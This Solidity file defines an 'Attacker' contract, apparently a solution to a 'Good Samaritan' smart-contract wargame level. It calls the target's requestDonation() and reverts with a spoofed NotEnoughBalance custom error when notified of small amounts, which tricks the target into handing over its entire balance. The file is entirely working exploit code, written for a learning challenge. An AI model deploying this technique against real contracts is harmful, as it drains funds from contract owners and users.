// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./good_samaritan.sol";

contract Attacker {
    error NotEnoughBalance();

    function execution(address payable goodSamaritanAddr) public payable {
        GoodSamaritan goodSamaritan = GoodSamaritan(goodSamaritanAddr);

        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}